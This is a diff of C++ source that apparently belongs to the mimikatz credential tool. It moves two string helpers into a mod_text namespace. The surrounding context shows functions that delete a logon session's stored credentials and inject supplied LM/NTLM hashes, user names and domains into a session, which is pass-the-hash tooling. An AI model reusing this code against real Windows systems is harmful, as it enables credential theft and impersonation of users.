@@ -83,7 +83,7 @@ __kextdll bool __cdecl delLogonSession(mod_pipe * monPipe, vector<wstring> * mes
 				idSecAppHigh = mesArguments->front(); idSecAppLow = mesArguments->back();
 			}
 
-			LUID idApp = wstringsToLUID(idSecAppHigh, idSecAppLow);
+			LUID idApp = mod_text::wstringsToLUID(idSecAppHigh, idSecAppLow);
 			if(idApp.LowPart != 0 || idApp.HighPart != 0)
 				maReponse << (NT_SUCCESS(NlpDeletePrimaryCredential(&idApp)) ? L"Suppression des données de sécurité réussie :)" : L"Suppression des données de sécurité en échec :(");
 			else maReponse << L"LUID incorrect !";
@@ -144,14 +144,14 @@ __kextdll bool __cdecl addLogonSession(mod_pipe * monPipe, vector<wstring> * mes
 				break;
 			}
 
-			LUID idApp = wstringsToLUID(idSecAppHigh, idSecAppLow);
+			LUID idApp = mod_text::wstringsToLUID(idSecAppHigh, idSecAppLow);
 
 			if(idApp.LowPart != 0 || idApp.HighPart != 0)
 			{
 				if((!kiwicreds.LmPasswordPresent || (lmHash.size() == 0x20)) && ntlmHash.size() == 0x20 && userName.size() <= MAX_USERNAME_LEN && domainName.size() <= MAX_DOMAIN_LEN)
 				{
-					InitLsaStringToBuffer(&kiwicreds.UserName, userName, kiwicreds.BuffUserName);
-					InitLsaStringToBuffer(&kiwicreds.LogonDomainName, domainName, kiwicreds.BuffDomaine);
+					mod_text::InitLsaStringToBuffer(&kiwicreds.UserName, userName, kiwicreds.BuffUserName);
+					mod_text::InitLsaStringToBuffer(&kiwicreds.LogonDomainName, domainName, kiwicreds.BuffDomaine);
 					if(kiwicreds.LmPasswordPresent)
 						mod_text::wstringHexToByte(lmHash, kiwicreds.LmOwfPassword);
 					mod_text::wstringHexToByte(ntlmHash, kiwicreds.NtOwfPassword);
@@ -168,21 +168,4 @@ __kextdll bool __cdecl addLogonSession(mod_pipe * monPipe, vector<wstring> * mes
 
 	maReponse << endl;
 	return sendTo(monPipe, maReponse.str());
-}
-
-
-void InitLsaStringToBuffer(LSA_UNICODE_STRING * LsaString, wstring &maDonnee, wchar_t monBuffer[])
-{
-	RtlCopyMemory(monBuffer, maDonnee.c_str(), (maDonnee.size() + 1) * sizeof(wchar_t));
-	RtlInitUnicodeString(LsaString, monBuffer);
-}
-
-LUID wstringsToLUID(wstring &highPart, wstring &lowPart)
-{
-	LUID monLUID = {0, 0};
-	wstringstream z;
-	z << highPart; z >> monLUID.HighPart;
-	z.clear();
-	z << lowPart; z >> monLUID.LowPart;
-	return monLUID;
 }
